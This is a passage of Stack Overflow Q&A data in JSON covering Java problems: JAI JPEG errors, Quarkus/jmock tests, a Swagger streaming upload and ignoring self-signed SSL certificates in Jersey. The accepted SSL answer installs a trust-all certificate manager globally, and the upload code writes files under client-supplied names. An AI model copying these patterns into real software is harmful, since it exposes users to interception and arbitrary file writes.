com.xerox.controller.util.EventDispatcher$EventConsumer.run(EventDispatcher.java:123)\r\nCaused by: java.lang.ClassNotFoundException: com.sun.medialib.mlib.Image\r\nat java.net.URLClassLoader.findClass(URLClassLoader.java:382)\r\nat java.lang.ClassLoader.loadClass(ClassLoader.java:418)\r\nat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:352)\r\nat java.lang.ClassLoader.loadClass(ClassLoader.java:351)\r\n... 26 more\r\n```\r\n\r\nHave already gone through some of the stackoverflow posts which suggested to include jai-imageio-core-1.4.0.jar and mlibwrapper.jar and tried. But no luck. Below are the jai related jars available in my path.\r\n\r\n```\r\n./jre1.8.0_292/lib/ext/jai-imageio-core-1.4.0.jar\r\n./jre1.8.0_292/lib/ext/mlibwrapper_jai.jar\r\n./jre1.8.0_292/lib/ext/jai_core.jar\r\n./jre1.8.0_292/lib/ext/jai_codec.jar\r\n./jdk1.8.0_292/jre/lib/ext/mlibwrapper_jai.jar\r\n./jdk1.8.0_292/jre/lib/ext/jai_core.jar\r\n./jdk1.8.0_292/jre/lib/ext/jai_codec.jar\r\n./jdk1.8.0_292/jre/lib/ext/jai-imageio-core-1.4.0.jar\r\n```\r\n\r\nAny additional jars we need or any configuration need to do? What did I miss. It will be more helpful.","title":"OpenJDK Java: JAI &quot;Error: One factory fails for the operation &quot;jpeg&quot;&quot;","body":"<p>The below sample program failed to run and throwing exception shown in error segment.</p>\n<pre><code>OS: Solaris 11\nJava Version: OpenJDK 8\nJAI: JAI libraries got from geosolutions not from Oracle. jai_codec.jar, jai_core.jar, jai-imageio-core-1.4.0.jar and mlibwrapper.jar.\n</code></pre>\n<p>JAI-Ext: <a href=\"https://github.com/geosolutions-it/jai-ext/wiki\" rel=\"nofollow noreferrer\">https://github.com/geosolutions-it/jai-ext/wiki</a></p>\n<p>JAISample.java:</p>\n<pre><code>import java.awt.Frame;\nimport java.awt.image.renderable.ParameterBlock;\nimport java.io.IOException;\nimport javax.media.jai.Interpolation;\nimport javax.media.jai.JAI;\nimport javax.media.jai.RenderedOp;\nimport com.sun.media.jai.codec.FileSeekableStream;\nimport javax.media.jai.widget.ScrollingImagePanel;\n/**\n * This program decodes an image file of any JAI supported\n * formats, such as GIF, JPEG, TIFF, BMP, PNM, PNG, into a\n * RenderedImage, scales the image by 2X with bilinear\n * interpolation, and then displays the result of the scale\n * operation.\n */\npublic class JAISampleProgram {\n /** The main method. */\n public static void main(String[] args) {\n /* Validate input. */\n// if (args.length != 1) {\n//System.out.println(&quot;Usage: java JAISampleProgram input_image_filename&quot;);\n// System.exit(-1);\n// }\n /*\n * Create an input stream from the specified file name\n * to be used with the file decoding operator.\n */\n FileSeekableStream stream = null;\n try {\n stream = new FileSeekableStream(&quot;/opt/XRX_NEXGENBLACK/current/IPMC/SFM20/images/SFM_174_0_0_0.jpg&quot;);\n } catch (IOException e) {\n e.printStackTrace();\n System.exit(0);\n }\n /* Create an operator to decode the image file. */\n RenderedOp image1 = JAI.create(&quot;stream&quot;, stream);\n /*\n* Create a standard bilinear interpolation object to be\n * used with the scale operator.\n */\n Interpolation interp = Interpolation.getInstance(\nInterpolation.INTERP_BILINEAR);\n /**\n* Stores the required input source and parameters in a\n* ParameterBlock to be sent to the operation registry,\n * and eventually to the scale operator.\n */\n ParameterBlock params = new ParameterBlock();\n params.addSource(image1);\n params.add(2.0F); // x scale factor\n params.add(2.0F); // y scale factor\n params.add(0.0F); // x translate\n params.add(0.0F); // y translate\n params.add(interp); // interpolation method\n /* Create an operator to scale image1. */\n RenderedOp image2 = JAI.create(&quot;scale&quot;, params);\n /* Get the width and height of image2. */\n int width = image2.getWidth();\n int height = image2.getHeight();\n/* Attach image2 to a scrolling panel to be displayed. */\n ScrollingImagePanel panel = new ScrollingImagePanel(\nimage2, width, height);\n /* Create a frame to contain the panel. */\n Frame window = new Frame(&quot;JAI Sample Program&quot;);\n window.add(panel);\n window.pack();\n window.show();\n }\n}\n</code></pre>\n<p>Error:</p>\n<pre><code>Error: One factory fails for the operation &quot;jpeg&quot;\nOccurs in: javax.media.jai.ThreadSafeOperationRegistry\njava.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\n        at JAISampleProgram.main(JAISampleProgram.java:58)\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\n        ... 24 more\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\n        ... 27 more\nError: One factory fails for the operation &quot;stream&quot;\nOccurs in: javax.media.jai.ThreadSafeOperationRegistry\njava.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\n        at JAISampleProgram.main(JAISampleProgram.java:58)\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\n        ... 15 more\nCaused by: java.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        ... 18 more\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\n        ... 24 more\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\n        ... 27 more\nException in thread &quot;main&quot; javax.media.jai.util.ImagingException: All factories fail for the operation &quot;stream&quot;\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\n        at JAISampleProgram.main(JAISampleProgram.java:58)\nCaused by: java.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        ... 9 more\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\n        ... 15 more\nCaused by: java.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        ... 18 more\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\n        ... 24 more\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\n        ... 27 more\nCaused by:\njava.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\n        at JAISampleProgram.main(JAISampleProgram.java:58)\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\n        ... 15 more\nCaused by: java.lang.reflect.InvocationTargetException\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\n        ... 18 more\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\n        ... 24 more\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\n        ... 27 more\n\n\n\n\n\n\n1626371845 Error: Could not find mediaLib accelerator wrapper classes. Continuing in pure Java mode.\n1626371845 Occurs in: com.sun.media.jai.mlib.MediaLibAccessor\njava.lang.NoClassDefFoundError: com/sun/medialib/mlib/Image\nat com.sun.media.jai.mlib.MediaLibAccessor$1.run(MediaLibAccessor.java:248)\nat java.security.AccessController.doPrivileged(Native Method)\nat com.sun.media.jai.mlib.MediaLibAccessor.setUseMlib(MediaLibAccessor.java:245)\nat com.sun.media.jai.mlib.MediaLibAccessor.useMlib(MediaLibAccessor.java:177)\nat com.sun.media.jai.mlib.MediaLibAccessor.isMediaLibCompatible(MediaLibAccessor.java:357)\nat com.sun.media.jai.mlib.MediaLibAccessor.isMediaLibCompatible(MediaLibAccessor.java:315)\nat com.sun.media.jai.mlib.MlibScaleRIF.create(MlibScaleRIF.java:67)\nat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\nat java.lang.reflect.Method.invoke(Method.java:498)\nat javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\nat javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\nat javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\nat javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\nat javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\nat javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\nat javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\nat com.sun.media.jai.widget.DisplayJAI.set(DisplayJAI.java:144)\nat com.xerox.controller.commonGUI.ImageViewer.scaleImage(ImageViewer.java:1677)\nat com.xerox.controller.commonGUI.ImageViewer.displayPage(ImageViewer.java:1400)\nat com.xerox.controller.commonGUI.ImageViewer.createPage(ImageViewer.java:2008)\nat com.xerox.controller.commonGUI.ImageViewer.updatePageCount(ImageViewer.java:2186)\nat com.xerox.controller.commonGUI.ImageViewer$ViewJobListener.handleEvent(ImageViewer.java:2357)\nat com.xerox.controller.util.EventDispatcher.serviceListeners(EventDispatcher.java:151)\nat com.xerox.controller.util.EventDispatcher$EventConsumer.run(EventDispatcher.java:123)\nCaused by: java.lang.ClassNotFoundException: com.sun.medialib.mlib.Image\nat java.net.URLClassLoader.findClass(URLClassLoader.java:382)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:418)\nat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:352)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:351)\n... 26 more\n</code></pre>\n<p>Have already gone through some of the stackoverflow posts which suggested to include jai-imageio-core-1.4.0.jar and mlibwrapper.jar and tried. But no luck. Below are the jai related jars available in my path.</p>\n<pre><code>./jre1.8.0_292/lib/ext/jai-imageio-core-1.4.0.jar\n./jre1.8.0_292/lib/ext/mlibwrapper_jai.jar\n./jre1.8.0_292/lib/ext/jai_core.jar\n./jre1.8.0_292/lib/ext/jai_codec.jar\n./jdk1.8.0_292/jre/lib/ext/mlibwrapper_jai.jar\n./jdk1.8.0_292/jre/lib/ext/jai_core.jar\n./jdk1.8.0_292/jre/lib/ext/jai_codec.jar\n./jdk1.8.0_292/jre/lib/ext/jai-imageio-core-1.4.0.jar\n</code></pre>\n<p>Any additional jars we need or any configuration need to do? What did I miss. It will be more helpful.</p>\n"},{"tags":["java","quarkus","jmock"],"answers":[{"tags":[],"owner":{"account_id":1010706,"reputation":1264,"user_id":1023341,"display_name":"gkephorus"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640255821,"creation_date":1640255821,"answer_id":70460918,"question_id":70460917,"body_markdown":"This is due to the JRE/JDK that Eclipse selects to run your tests. These tests should be run using a JDK only, the JRE that comes whith most versions of Eclipse will not service.\r\nSo: install a full JDK (eg. by using sdkman) and specify &amp; select that to run your tests in this part of the preferences of Eclipse:\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/DXMRi.png","title":"Quarkus tests fail while doing mocking with jmock resulting in &quot;No code generation strategy available&quot;","body":"<p>This is due to the JRE/JDK that Eclipse selects to run your tests. These tests should be run using a JDK only, the JRE that comes whith most versions of Eclipse will not service.\nSo: install a full JDK (eg. by using sdkman) and specify &amp; select that to run your tests in this part of the preferences of Eclipse:\n<a href=\"https://i.stack.imgur.com/DXMRi.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/DXMRi.png\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":1010706,"reputation":1264,"user_id":1023341,"display_name":"gkephorus"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":156,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70460918,"answer_count":1,"score":0,"last_activity_date":1640255821,"creation_date":1640255821,"question_id":70460917,"body_markdown":"When running my Quarkus tests in combination with jmock I run into:\r\n\r\n    java.lang.IllegalStateException: No code generation strategy available\r\n\r\nThis is what I have setup jmock with:\r\n\r\n```Java\r\n@QuarkusTest\r\n@Tag(&quot;integration&quot;)\r\nclass MyServiceTest {\r\n    @RegisterExtension\r\n    JUnit5Mockery mockery = new JUnit5Mockery() {\r\n        {\r\n            setImposteriser(ByteBuddyClassImposteriser.INSTANCE);\r\n            setThreadingPolicy(new Synchroniser());\r\n        }\r\n    };\r\n\r\n```\r\n\r\nTo make matters worse: This all works on the command line but not within Eclipse.\r\n","title":"Quarkus tests fail while doing mocking with jmock resulting in &quot;No code generation strategy available&quot;","body":"<p>When running my Quarkus tests in combination with jmock I run into:</p>\n<pre><code>java.lang.IllegalStateException: No code generation strategy available\n</code></pre>\n<p>This is what I have setup jmock with:</p>\n<pre><code>@QuarkusTest\n@Tag(&quot;integration&quot;)\nclass MyServiceTest {\n    @RegisterExtension\n    JUnit5Mockery mockery = new JUnit5Mockery() {\n        {\n            setImposteriser(ByteBuddyClassImposteriser.INSTANCE);\n            setThreadingPolicy(new Synchroniser());\n        }\n    };\n\n</code></pre>\n<p>To make matters worse: This all works on the command line but not within Eclipse.</p>\n"},{"tags":["java","spring-boot","rest","swagger","swagger-ui"],"owner":{"account_id":1018410,"reputation":3054,"user_id":1029433,"accept_rate":82,"display_name":"kaissun"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":244,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1640255697,"creation_date":1640255697,"question_id":70460885,"body_markdown":"I wonder if it is possible to show the input file to select in my Swagger UI when exposing the API. \r\nI confirm that it is working perfectly when defining the endpoint as following: \r\n\r\n    public ResponseEntity&lt;String&gt; upload(@RequestPart MultipartFile file)\r\n\r\nThere is no doubt to show the file chooser when using `MultipartFile`. \r\n\r\n[![file chooser][1]][1]\r\n\r\nAnd as I would like to upload big files, I have to use `HttpServletRequest` instead in order to upload the file as a stream. The endpoint will be then like:\r\n    \r\n\r\n    public @ResponseBody Response&lt;String&gt; upload(HttpServletRequest request) {\r\n                // Create a new file upload handler\r\n                ServletFileUpload upload = new ServletFileUpload();\r\n                // Parse the request\r\n                FileItemIterator iter = upload.getItemIterator(request);\r\n                while (iter.hasNext()) {\r\n                        FileItemStream item = iter.next();\r\n                        String name = item.getFieldName();\r\n                        InputStream stream = item.openStream();\r\n                        if (!item.isFormField()) {\r\n                                String filename = item.getName();\r\n                                // Process the input stream\r\n                                OutputStream out = new FileOutputStream(filename);\r\n                                IOUtils.copy(stream, out);\r\n                                stream.close();\r\n                                out.close();\r\n                        }\r\n                }\r\n                return new Response&lt;String&gt;(true, &quot;Success&quot;, &quot;&quot;);\r\n    }\r\n\r\nThe endpoint is working well using a curl command. But unfortunately when using the Swagger UI, I am not able to show the file chooser. &lt;br&gt;\r\nDoes anyone faced the same case or knows if Swagger supports this feature?\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/ZV9xt.png","title":"Rest Controller: uploading file using HttpServletRequest through Swagger UI","body":"<p>I wonder if it is possible to show the input file to select in my Swagger UI when exposing the API.\nI confirm that it is working perfectly when defining the endpoint as following:</p>\n<pre><code>public ResponseEntity&lt;String&gt; upload(@RequestPart MultipartFile file)\n</code></pre>\n<p>There is no doubt to show the file chooser when using <code>MultipartFile</code>.</p>\n<p><a href=\"https://i.stack.imgur.com/ZV9xt.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZV9xt.png\" alt=\"file chooser\" /></a></p>\n<p>And as I would like to upload big files, I have to use <code>HttpServletRequest</code> instead in order to upload the file as a stream. The endpoint will be then like:</p>\n<pre><code>public @ResponseBody Response&lt;String&gt; upload(HttpServletRequest request) {\n            // Create a new file upload handler\n            ServletFileUpload upload = new ServletFileUpload();\n            // Parse the request\n            FileItemIterator iter = upload.getItemIterator(request);\n            while (iter.hasNext()) {\n                    FileItemStream item = iter.next();\n                    String name = item.getFieldName();\n                    InputStream stream = item.openStream();\n                    if (!item.isFormField()) {\n                            String filename = item.getName();\n                            // Process the input stream\n                            OutputStream out = new FileOutputStream(filename);\n                            IOUtils.copy(stream, out);\n                            stream.close();\n                            out.close();\n                    }\n            }\n            return new Response&lt;String&gt;(true, &quot;Success&quot;, &quot;&quot;);\n}\n</code></pre>\n<p>The endpoint is working well using a curl command. But unfortunately when using the Swagger UI, I am not able to show the file chooser. <br>\nDoes anyone faced the same case or knows if Swagger supports this feature?</p>\n"},{"tags":["java","ssl","ssl-certificate","jersey"],"comments":[{"owner":{"account_id":14561053,"reputation":635,"user_id":10538678,"display_name":"Matej J"},"score":0,"creation_date":1605789812,"post_id":6047996,"comment_id":114763329,"body_markdown":"Does this answer your question? [Java client certificates over HTTPS/SSL](https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl\">Java client certificates over HTTPS/SSL</a>"}],"answers":[{"tags":[],"owner":{"account_id":36857,"reputation":3106,"user_id":105223,"accept_rate":84,"display_name":"Chris Salij"},"down_vote_count":3,"up_vote_count":105,"is_accepted":true,"score":102,"last_activity_date":1305794134,"creation_date":1305794134,"answer_id":6055903,"question_id":6047996,"body_markdown":"After some searching and trawling through some old stackoverflow questions I&#39;ve found a solution in a previously asked SO question:\r\n\r\n - Question: https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl\r\n - Answer https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl/876785#876785\r\n\r\nHere&#39;s the code that I ended up using.\r\n\r\n    // Create a trust manager that does not validate certificate chains\r\n    TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager(){\r\n        public X509Certificate[] getAcceptedIssuers(){return null;}\r\n        public void checkClientTrusted(X509Certificate[] certs, String authType){}\r\n        public void checkServerTrusted(X509Certificate[] certs, String authType){}\r\n    }};\r\n    \r\n    // Install the all-trusting trust manager\r\n    try {\r\n        SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);\r\n        sc.init(null, trustAllCerts, new SecureRandom());\r\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\r\n    } catch (Exception e) {\r\n        ;\r\n    }","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>After some searching and trawling through some old stackoverflow questions I've found a solution in a previously asked SO question:</p>\n\n<ul>\n<li>Question: <a href=\"https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl\">Java client certificates over HTTPS/SSL</a></li>\n<li>Answer <a href=\"https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl/876785#876785\">Java client certificates over HTTPS/SSL</a></li>\n</ul>\n\n<p>Here's the code that I ended up using.</p>\n\n<pre><code>// Create a trust manager that does not validate certificate chains\nTrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager(){\n    public X509Certificate[] getAcceptedIssuers(){return null;}\n    public void checkClientTrusted(X509Certificate[] certs, String authType){}\n    public void checkServerTrusted(X509Certificate[] certs, String authType){}\n}};\n\n// Install the all-trusting trust manager\ntry {\n    SSLContext sc = SSLContext.getInstance(\"TLS\");\n    sc.init(null, trustAllCerts, new SecureRandom());\n    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n} catch (Exception e) {\n    ;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":93597,"reputation":3025,"user_id":255982,"accept_rate":89,"display_name":"Ransom Briggs"},"down_vote_count":2,"up_vote_count":14,"is_accepted":false,"score":12,"last_activity_date":1373378395,"creation_date":1308145845,"answer_id":6358767,"question_id":6047996,"body_markdown":"I had the same problem adn did not want this to be set globally, so I used the same TrustManager and SSLContext code as above, I just changed the Client to be created with special properties\r\n\r\n     ClientConfig config = new DefaultClientConfig();\r\n     config.getProperties().put(HTTPSProperties.PROPERTY_HTTPS_PROPERTIES, new HTTPSProperties(\r\n         new HostnameVerifier() {\r\n             @Override\r\n             public boolean verify( String s, SSLSession sslSession ) {\r\n                 // whatever your matching policy states\r\n             }\r\n         }\r\n     ));\r\n     Client client = Client.create(config);","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>I had the same problem adn did not want this to be set globally, so I used the same TrustManager and SSLContext code as above, I just changed the Client to be created with special properties</p>\n\n<pre><code> ClientConfig config = new DefaultClientConfig();\n config.getProperties().put(HTTPSProperties.PROPERTY_HTTPS_PROPERTIES, new HTTPSProperties(\n     new HostnameVerifier() {\n         @Override\n         public boolean verify( String s, SSLSession sslSession ) {\n             // whatever your matching policy states\n         }\n     }\n ));\n Client client = Client.create(config);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":155770,"reputation":120153,"user_id":372643,"accept_rate":88,"display_name":"Bruno"},"down_vote_count":2,"up_vote_count":10,"is_accepted":false,"score":8,"last_activity_date":1606251222,"creation_date":1376486306,"answer_id":18232844,"question_id":6047996,"body_markdown":"&gt; This code will only ever be run against test servers so I don&#39;t want\r\n&gt; to go to the hassle of adding new trusted certs each time we set up a\r\n&gt; new test server.\r\n\r\nThis is the kind of code that will eventually find its way in production (if not from you, someone else who&#39;s reading this question will copy and paste the insecure trust managers that have been suggested into their applications). It&#39;s just so easy to 